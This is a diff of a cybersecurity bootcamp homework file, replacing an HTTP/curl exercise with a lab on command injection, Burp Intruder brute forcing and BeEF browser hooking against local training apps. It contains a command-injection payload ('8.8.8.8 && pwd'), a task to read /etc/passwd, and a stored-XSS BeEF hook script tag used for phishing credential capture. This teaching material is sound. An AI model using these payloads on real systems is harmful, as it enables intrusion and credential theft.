@@ -1,340 +1,310 @@
-## Week 14 Homework: Web Development
+# Unit 15 Homework
 
-### Overview
+## Overview
 
-In this homework, we will review the many of the concepts and tools covered in the Web Development unit. If needed, refer to the  reference sheets provided to you.
+In this homework scenario, you will continue as an application security engineer at Replicants. Replicants created several new web applications and would like you to continue testing them for vulnerabilities. Additionally, your manager would like you to research and test a security tool called **BeEF** in order to understand the impact it could have on the organization if Replicants was targeted with this tool. 
 
-* [HTTP Reference Sheet](./HTTP_Reference.md)
-* [curl Reference Sheet](./cURL_Reference.md)
+### Lab Environment
 
----
+You will continue to use your Vagrant virtual machine for this assignment.
 
-### Questions 
+### Topics Covered in Your Assignment
 
-Before you work through the questions below, please create a new file and record your answers there. This will be your homework deliverable.
+- Web application vulnerability assessments
+- Injection
+- Brute force attacks
+- Broken authentication
+- Burp Suite
+- Web proxies
+- Directory traversal
+- Dot dot slash attacks
+- Beef
+- Cross-site scripting
+- Malicious payloads
 
-#### HTTP Requests and Responses
-
-Answer the following questions about the HTTP request and response process.
-
-1. What type of architecture does the HTTP request and response process occur in?
-
-2. What are the different parts of an HTTP request? 
-
-3. Which part of an HTTP request is optional?
-
-4. What are the three parts of an HTTP response?
-
-5. Which number class of status codes represents errors?
-
-6. What are the two most common request methods that a security professional will encounter?
-
-7. Which type of HTTP request method is used for sending data?
-
-8. Which part of an HTTP request contains the data being sent to the server?
-
-9. In which part of an HTTP response does the browser receive the web code to generate and style a web page?
-
-#### Using curl
-
-Answer the following questions about `curl`:
-
-10. What are the advantages of using `curl` over the browser?
-
-11. Which `curl` option is used to change the request method?
-
-12. Which `curl` option is used to set request headers?
-
-13. Which `curl` option is used to view the response header?
-
-14. Which request method might an attacker use to figure out which HTTP requests an HTTP server will accept?
-
-#### Sessions and Cookies
-
-Recall that HTTP servers need to be able to recognize clients from one another. They do this through sessions and cookies.
-
-Answer the following questions about sessions and cookies:
-
-15. Which response header sends a cookie to the client?
-
-    ```HTTP
-    HTTP/1.1 200 OK
-    Content-type: text/html
-    Set-Cookie: cart=Bob
-    ```
-
-16. Which request header will continue the client's session?
-
-    ```HTTP
-    GET /cart HTTP/1.1
-    Host: www.example.org
-    Cookie: cart=Bob
-    ```
-
-#### Example HTTP Requests and Responses
-
-Look through the following example HTTP request and response and answer the following questions:
-
-**HTTP Request**
-
-```HTTP
-POST /login.php HTTP/1.1
-Host: example.com
-Accept-Encoding: gzip, deflate, br
-Connection: keep-alive
-Content-Type: application/x-www-form-urlencoded
-Content-Length: 34
-Upgrade-Insecure-Requests: 1
-User-Agent: Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Mobile Safari/537.36
-
-username=Barbara&password=password
-```
-
-17. What is the request method?
-
-18. Which header expresses the client's preference for an encrypted response?
-
-19. Does the request have a user session associated with it?
-
-20. What kind of data is being sent from this request body?
-
-**HTTP Response**
-
-```HTTP
-HTTP/1.1 200 OK
-Date: Mon, 16 Mar 2020 17:05:43 GMT
-Last-Modified: Sat, 01 Feb 2020 00:00:00 GMT
-Content-Encoding: gzip
-Expires: Fri, 01 May 2020 00:00:00 GMT
-Server: Apache
-Set-Cookie: SessionID=5
-Content-Type: text/html; charset=UTF-8
-Strict-Transport-Security: max-age=31536000; includeSubDomains
-X-Content-Type: NoSniff
-X-Frame-Options: DENY
-X-XSS-Protection: 1; mode=block
-
-[page content]
-```
-
-21. What is the response status code?
-
-22. What web server is handling this HTTP response?
-
-23. Does this response have a user session associated to it?
-
-24. What kind of content is likely to be in the [page content] response body?
-
-25. If your class covered security headers, what security request headers have been included?
-
-#### Monoliths and Microservices
-
-Answer the following questions about monoliths and microservices:
-
-26. What are the individual components of microservices called?
-
-27. What is a service that writes to a database and communicates to other services?
-
-28. What type of underlying technology allows for microservices to become scalable and have redundancy?
-
-#### Deploying and Testing a Container Set
-
-Answer the following questions about multi-container deployment:
-
-29. What tool can be used to deploy multiple containers at once?
-
-30. What kind of file format is required for us to deploy a container set?
-
-#### Databases
-
-31. Which type of SQL query would we use to see all of the information within a table called `customers`?
-
-32. Which type of SQL query would we use to enter new data into a table? (You don't need a full query, just the first part of the statement.)
-
-33. Why would we never run `DELETE FROM <table-name>;` by itself?
 
 ---
 
-### Bonus Challenge Overview: The Cookie Jar
+## Instructions
 
-For this challenge, you'll once again be using `curl`, but this time to manage and swap sessions.
+In this assignment, you will test three web application vulnerabilities. For each vulnerability you will be provided with the following:
 
-:warning: **Heads Up**: You'll need to have WordPress set up from the Swapping Sessions activity from Day 1 of this unit. If you have not done it or it is improperly set up, please refer to the Day 1 student guide and the Swapping Sessions activity file.
+  - Steps detailing how to setup and access the application.
 
-If you recall, on Day 1 of this unit you used Google Chrome's Cookie-Editor extension to swap sessions and cookies. For this homework challenge, we'll be using the command-line tool `curl` to practice swapping cookie and sessions within the WordPress app.
+  - A walkthrough explaining how the application is intended to work.
 
-It is important for cybersecurity professionals to know how to manage cookies with `curl`:
+  - A task that will test the application for vulnerabilities.
 
-- Web application security engineers need to regularly ensure cookies are both functional and safe from tampering.
-
-  - For example, you might need to request a cookie from a webpage and then test various HTTP responses using that cookie. Doing this over and over through the browser is tedious, but can be automated with scripts.
-
-- The same concept applies for penetration testers and hackers: `curl` is used to quickly save a cookie in order to test various exploits.
-
-  - For example, an HTTP server may be configured so that, in order to POST data to specific pages, clients need to have cookies or authentication information set in their request headers, which the server will verify.
-
-#### Revisiting curl
-
-Recall that you used `curl` to craft different kinds of requests for your `curl` activity, and that you saw how to use the Chrome extension Cookie-Editor to export and import cookies and swap sessions.
-
-There will be many systems in which you will need to test requests and cookies that will not connect to a browser or browser extension. 
-
-`curl` not only allows users to look through headers, send data, and authenticate to servers, but also to save and send cookies through two `curl` options: `--cookie-jar` and `--cookie`.
-
-These two options work exactly like Cookie-Editor, but on the command line. 
-
-- `--cookie-jar` allows a curl user to save the cookies set within a response header into a text file.
-
-- `--cookie` allows a user to specify a text file where a cookie is saved, in order to send a request with the cookies embedded in the request header.
-
-Let's look at how we can create a `curl` command that will log into a web page with a supplied username and password, and also save the server's response that should contain a cookie.
-
-#### Logging In and Saving Cookies with Curl
-
-If we want to use the `curl` command to log into an account, `Amanda`, with the password `password`, we use the following `curl` options:
-
-- `curl --cookie-jar ./amandacookies.txt --form "log=Amanda" --form "pwd=password" http://localhost:8080/wp-login.php --verbose`
-- `curl`: The tool that we are using.
-  
-- `--cookie-jar`: Specifies where we will save the cookies.
-  
-- `./amandacookies.txt`: Location and file where the cookies will be saved.
-  
-- `--form`: Lets us pick the login username and password forms that we set in our user info earlier. In this case it's our username.
-  
-- `log=Amanda`: How WordPress understands and accepts usernames.
-  
-- `--form`: Lets us pick the login username and password forms that we set in our user info earlier. In this case it's our password.
-  
-- `pwd=password`: How WordPress understands and accepts passwords.
-  
-- `http://localhost:8080/wp-login.php`: Our WordPress login page.
-  
-- `--verbose`: Outputs more specific description about the actions the command is taking.  
-
-Run the command:  `curl --cookie-jar ./amandacookies.txt --form "log=Amanda" --form "pwd=password" http://localhost:8080/wp-login.php --verbose`
-
-If the site confirms our credentials, it will give us a cookie in return, which `curl` will save in the cookie jar file `./amandacookies.txt`.
-
-Now let's look at how to use that saved cookie on a page that requires us to be logged in.
-
-#### Using a Saved Cookie
-
-To use a saved cookie, we use the following `curl` syntax:
-
-- `curl --cookie ./amandacookies.txt http://localhost:8080/wp-admin/users.php`
-  - `curl`: The tool that we are using.
-    
-  - `--cookie`: Precedes the location of our saved cookie that we want to use.
-    
-  - `./amandacookies.txt`: Location and file where the cookies are saved.
-    
-  - `http://localhost:8080/wp-admin/users.php`: A page that requires authentication to see properly. Note that we are not going to the login page, because supplying a cookie in this instance assumes that we are already logged in.
-
-Now that we know how to use the `curl` cookie jar, let's look at what we need to do for this challenge.
-
----
-
-### Bonus Challenge Instructions: The Cookie Jar
-
-First, using Docker Compose, navigate to the Day 1 WordPress activity directory and bring up the container set:
-
-- `/home/sysadmin/Documents/docker_files`
-
-Using `curl`, you will do the following for the Ryan user:
-
-  - Log into WordPress and save the user's cookies to a cookie jar.
-
-  - Test a WordPress page by using a cookie from the cookie jar.
-
-  - Pipe the output from the cookie with `grep` to check for authenticated page access.
-
-  - Attempt to access a privileged WordPress admin page.
-
-#### Step 1: Set Up
-
-Create two new users: Amanda and Ryan.   
-
-1. Navigate to `localhost:8080/wp-admin/`
-
-2. On the left-hand toolbar, hover over **Users** and click **Add New**.
-
-3. Enter the following information to create the new user named Amanda.
-
-    - Username: `Amanda`
-    - Email: `amanda@email.com`
-
-4. Skip down to password:
-
-    - Password: `password`
-    - Confirm Password: Check the box to confirm use of weak password.
-    - Role: `Administrator`
-
-5. Create another user named Ryan.
-
-    - Username: `Ryan`
-    - Email: `ryan@email.com`
-
-6. Skip down to password:
-
-    - Password: `123456`
-    - Confirm Password: Check the box to confirm use of weak password.
-    - Role: `Editor`
-
-7. Log out and log in with the following credentials:
-
-    - Username: `Amanda`
-    - Password: `password`
-
-#### Step 2: Baselining
-
-For these "baselining" steps, you'll want to log into two different types of accounts to see how the WordPress site looks at the `localhost:8080/wp-admin/users.php` page.  We want to see how the Users page looks from the perspective of an administrator, vs. a regular user.
-
-1. Using your browser, log into your WordPress site as your sysadmin account and navigate to `localhost:8080/wp-admin/users.php`, where we previously created the user Ryan. Examine this page briefly. Log out.
-
-2. Using your browser, log into your Ryan account and attempt to navigate to `localhost:8080/wp-admin/index.php`. Note the wording on your Dashboard.
-
-3. Attempt to navigate to `localhost:8080/wp-admin/users.php`. Note what you see now.
-
-Log out in the browser.
-
-#### Step 3: Using Forms and a Cookie Jar
-
-Navigate to `~/Documents` in a terminal to save your cookies.
-
-1. Construct a `curl` request that enters two forms: `"log={username}"` and `"pwd={password}"` and goes to `http://localhost:8080/wp-login.php`. Enter Ryan's credentials where there are placeholders.
-
-    - **Question:** Did you see any obvious confirmation of a login? (Y/N)
-
-2. Construct the same `curl` request, but this time add the option and path to save your cookie: `--cookie-jar ./ryancookies.txt`. This option tells `curl` to save the cookies to the `ryancookies.txt` text file.
-
-3. Read the contents of the `ryancookies.txt` file.
-
-   - **Question:** How many items exist in this file?
-
-Note that each one of these is a cookie that was granted to Ryan after logging in.
-
-#### Step 4: Log in Using Cookies
-
-1. Craft a new `curl` command that now uses the `--cookie` option, followed by the path to your cookies file. For the URL, use `http://localhost:8080/wp-admin/index.php`.
-
-   - **Question:** Is it obvious that we can access the Dashboard? (Y/N)
-
-2. Press the up arrow on your keyboard to run the same command, but this time, pipe `| grep Dashboard` to the end of your command to return all instances of the word `Dashboard` on the page.
-
-    - **Question:**  Look through the output where `Dashboard` is highlighted. Does any of the wording on this page seem familiar? (Y/N) If so, you should be successfully logged in to your Editor's dashboard.
-
-#### Step 5: Test the Users.php Page
-
-1. Finally, write a `curl` command using the same `--cookie ryancookies.txt` option, but attempt to access `http://localhost:8080/wp-admin/users.php`.
-
-    - **Question:** What happens this time?
-
----
+Your goal is to determine if the application is vulnerable and provide mitigations.
 
 ### Submission Guidelines
 
-* Save the file where you documented your solutions and submit it as your homework deliverable. 
+You will submit a document (Word or Google Docs) that contains the following for each web application: 
+
+- Screen shots confirming the successful exploit.
+
+- Two to three sentences detailing recommended mitigation strategies. 
+
+When complete, submit the file on BCS.   
+
 
 ---
-© 2020 Trilogy Education Services, a 2U, Inc. brand. All Rights Reserved.  
+
+### Web Application 1: *Your Wish is My Command Injection*
+
+1. Complete the following to set up the activity. 
+
+    - Access Vagrant and open a browser.
+
+    - Navigate to the following webpage: <http://192.168.13.25> and select the **Command Injection** option.
+      
+      - Alternatively, access the webpage directly at this page: <http://192.168.13.25/vulnerabilities/exec/>
+      
+      - The web page should look like the following:
+
+        ![wd_hw1](Images/wd_hw1.png)
+
+   **Note:** If you have any issues accessing this webpage,  refer to the Activity Setup steps we completed in the activity `06_SQL_Injection` on Day 1 of this unit. 
+
+    - <details><summary> Click here to view the set up instructions.</summary>
+
+
+      - To launch the environment, complete the following:
+
+        - Launch Vagrant from GitBash or the Mac terminal using the following command: `vagrant up`
+        
+        - Then, open the command line inside Vagrant and run the following command: `cd ./Documents/web-vulns && docker-compose up`.
+
+        - Leave this page open and continue to the next step. 
+
+      - To access the Replicants website, open a web browser within Vagrant and access the following webpage: <http://192.168.13.25/setup.php>.
+
+        - On the bottom of this page, click **Create / Reset Database**.
+      
+        - This will configure the database for the application.
+        
+        - The message "Setup Successful" at the bottom of the page will indicate that it is complete. 
+
+      - To log in to the mock Replicants website, access the following webpage: <http://192.168.13.25/login.php>.
+
+        - Log in with the following credentials:
+          
+          - Username: `admin`
+          
+          - Password: `password`
+
+    </details>
+
+
+2. This page is a new web application built by Replicants in order to enable their customers to `ping` an IP address. The web page will return the results of the ping command back to the user.
+
+   Complete the following steps to walkthrough the intended purpose of the web application. 
+
+   - Test the webpage by entering the IP address `8.8.8.8`. Press Submit to see the results display on the web application.
+
+     ![wd_hw2](Images/wd_hw2.png)
+
+     - Behind the scenes, when you select Submit, the IP you type in the field is *injected* into a command that is run against the Replicants webserver. The specific command that ran on the webserver is `ping <IP>` and `8.8.8.8` is the field value that is injected into that command.
+     
+     - This process is no different than if we went to the command line and typed that same command: `ping 8.8.8.8`
+
+       ![wd_hw3](Images/wd_hw3.png)
+
+3. Test if we can manipulate the input to cause an unintended result.
+
+    - On the same webpage, enter the following command (payload) in the field: `8.8.8.8 && pwd`
+
+    - This command uses two ampersands to add a second command to the original request:
+
+      - `pwd` is the second command. It will display the directory location where the command is run on the Replicants webserver.
+     
+      - This would be no different than running `ping 8.8.8.8 && pwd` on the command line. 
+  
+   - Press Enter. Note the ping results are the results of the second `pwd` command:
+
+     ![wd_hw4](Images/wd_hw4.png)
+
+    This type of injection attack is called **Command Injection**, and it is dependent on the web application taking user input to run a command against an operating system.
+
+4. Now that you have determined that Replicants new application is vulnerable to command injection, you are tasked with using the dot-dot-slash method to design two payloads that will display the contents of the following files:
+   
+   - `/etc/passwd`
+   
+   - `/etc/hosts`
+  
+   **Hint:** Try testing out a command directly on the command line to help design your payload.
+
+5. **Deliverable**: Take a screen shot confirming that this exploit was successfully executed and provide 2-3 sentences outlining mitigation strategies. 
+
+
+### Web Application 2: *A Brute Force to Be Reckoned With*
+
+1. Complete the following steps to set up the activity. 
+
+    - Open a browser on Vagrant and navigate to the webpage <http://192.168.13.35/install.php>.
+  
+    -  The page should look like the following:
+
+       ![wd_hw5](Images/wd_hw5.png)
+
+    - Click "here" to install bWapp. (See the arrow in the previous screenshot.) 
+    
+    - After successfully installing bWapp, use the following credentials to login.
+
+      - Login: `bee`
+
+      - Password: `bug`
+
+       ![wd_hw6](Images/wd_hw6.png)
+
+ 
+    - This will take you to the following page:
+
+      ![wd_hw7](Images/wd_hw7.png)
+
+    - To access the application where we will perform our activity, enter in the following URL: <http://192.168.13.35/ba_insecure_login_1.php>
+
+      - This will take you to the following page:
+
+        ![wd_hw8](Images/wd_hw8.png)
+
+2. This page is an administrative web application that serves as a simple login page. An administrator enters their username and password and selects Login.
+     
+    - If the user/password combination is correct, it will return a successful message.
+     
+    - If the user/password combination is incorrect, it will return the message, "Invalid credentials."
+
+3. Years ago, Replicants had a systems breach and several administrators passwords were stolen by a malicious hacker. The malicious hacker was only able to capture a list of passwords, not the associated accounts' usernames. Your manager is concerned that one of the administrators that accesses this new web application is using one of these compromised passwords. Therefore, there is a risk that the malicious hacker can use these passwords to access an administrator's account and view confidential data.
+
+   - Use the web application tool **Burp Suite**, specifically the **Burp Suite Intruder** feature, to determine if any of the administrator accounts are vulnerable to a brute force attack on this web application. 
+
+   - You've been provided with a list of administrators and the breached passwords:
+
+     - [List of Administrators](listofadmins.txt)
+     
+     - [Breached list of Passwords](breached_passwords.txt)
+  
+   - Hint: Refer back to the Burp Intruder activity `10_Brute_Force` from Day 3 for guidance.
+ 
+4. **Deliverable**: Take a screen shot confirming that this exploit was successfully executed and provide 2-3 sentences outlining mitigation strategies. 
+
+### Web Application 3: *Where's the BeEF?*
+
+1. Complete the following to set up the activity. 
+
+   - On Vagrant, open a command line and run the following command: `sudo beef`
+
+   - When prompted for a password, enter `cybersecurity`.
+
+   - This will kick off the BeEF application and return many details about the application to your terminal.
+
+   - Along with these details are several URLs that can be used to access to BeEF's User Interface (UI). For example: `UI_URL: http://127.0.0.1:3000/ui/panel` 
+   
+   - To access the BeEF GUI, right-click the first URL and select Open Link.
+
+     ![wd_hw10](Images/wd_hw10.png)
+
+   - When the BeEF webpage opens, login with the following credentials:
+     - Username: `beef`
+     
+     - Password: `feeb`
+
+     ![wd_hw11](Images/wd_hw11.png)
+
+   - You have successfully completed the setup when you have reached the `BeEF Control Panel` shown in the image below:
+
+     ![wd_hw12](Images/wd_hw12.png)
+
+2. The Browser Exploitation Framework (BeEF) is a practical client-side attack tool that exploits vulnerabilities of web browsers to assess the security posture of a target.      
+
+   - While BeEF was developed for lawful research and penetration testing, criminal hackers leverage it as an attack tool.
+  
+   - An attacker takes a small snippet of code, called a BeEF Hook, and determines a way to add this code into a target website. This is commonly done by cross-site scripting.
+
+   - When subsequent users access the infected website, the users' browsers become *hooked*.
+     - Once a browser is hooked, it is referred to as a **zombie**. A zombie is an infected browser that awaits instructions from the BeEF control panel.
+     - The BeEF control panel has hundreds of exploits that can be launch against the *hooked* victims, including:
+       - Social engineering attacks 
+       - Stealing confidential data from the victim's machine
+       - Accessing system and network information from the victim's machine
+       
+3. BeEF includes a feature to test out a simulation of an infected website.
+    
+    - To access this simulated infected website, locate the following sentence on the BeEF control panel: `To begin with, you can point a browser towards the basic demo page here, or the advanced version here.`
+    
+    - Click the second "here" to access the advanced version.  
+     
+       ![wd_hw13](Images/wd_hw13.png)
+
+    - This will open the following website, which has been infected with a BeEF hook.
+
+       ![wd_hw14](Images/wd_hw14.png)
+
+    - Note that once you have pulled up this infected webpage, your browser has now been hooked!
+
+    	- If your browser has not been hooked, restart your browser and try again.
+
+    -  Return to the control panel. On the left side, you can notice that your browser has become infected since accessing the infected Butcher website. Note that if multiple browsers become infected they will all be listed individually on the left hand side of this panel.
+
+      - Click on the browser `127.0.0.1` as indicated in the screenshot below.
+
+        ![wd_hw15](Images/wd_hw15.png)
+
+      - Under the Details tab, we can see information about the infected browser. 
+
+4. Now we are ready to test an exploit.
+
+    - Select the Commands tabs. 
+    
+      - This will list folders of hundreds of exploits that can be ran against the hooked browser. Note that many may not work, as they are dependent on the browser and security settings enabled.
+  
+   - First, we'll attempt a social engineering phishing exploit to create a fake Google login pop up. We can use this to capture user credentials.
+     
+   - To access this exploit, select Google Phishing under Social Engineering.
+
+       ![wd_hw16](Images/wd_hw16.png)
+
+   - After selecting this option, the description of the exploit and any dependencies or options are displayed in the panel on the right.
+
+       ![wd_hw17](Images/wd_hw17.png)
+
+   - To launch the exploit, select Execute in the bottom right corner.
+
+     - After selecting Execute, return back to your browser that was displaying the Butcher Shop website. Note that it has been changed to a Google login page.
+
+     - A victim could easily mistake this for a real login prompt.
+
+   - Lets see what would happen if a victim entered in their credentials. Use the following credentials to login in to the fake Google page. 
+     - Username: `hackeruser`
+     - Password: `hackerpass`
+
+       ![wd_hw18](Images/wd_hw18.png)
+
+   - Return to the BeEF control panel. In the center panel, select the first option. Note that now on the right panel, the username and password have been captured by the attacker.
+
+     ![wd_hw19](Images/wd_hw19.png)
+
+5. Now that you know how to use the BeEF tool, you'll use it to test the Replicants web application. You are tasked with using a stored XSS attack to inject a BeEF hook into Replicants' main website.
+
+   - Task details:
+     - The page you will test is the Replicants Stored XSS application which was used the first day of this unit: `http://192.168.13.25/vulnerabilities/xss_s/`
+     - The BeEF hook, which was returned after running the `sudo beef` command was: `http://127.0.0.1:3000/hook.js`
+     - The payload to inject with this BeEF hook is: `<script src="http://127.0.0.1:3000/hook.js"></script>`
+
+   -  When you attempt to inject this payload,  you will encounter a client-side limitation that will not allow you to enter the whole payload. You will need to find away around this limitation.    
+      
+      - **Hint:** Try right-clicking and selecting "Inspecting the Element".
+    
+   - Once you are able to hook into Replicants website, attempt a couple BeEF exploits. Some that work well include:
+     
+     - Social Engineering >> Pretty Theft
+     
+     - Social Engineering >> Fake Notification Bar
+     
+     - Host >> Get Geolocation (Third Party)
+    
+6. **Deliverable**: Take a screen shot confirming that this exploit was successfully executed and provide 2-3 sentences outlining mitigation strategies. 
+
+---
+
+© 2021 Trilogy Education Services, a 2U, Inc. brand. All Rights Reserved.
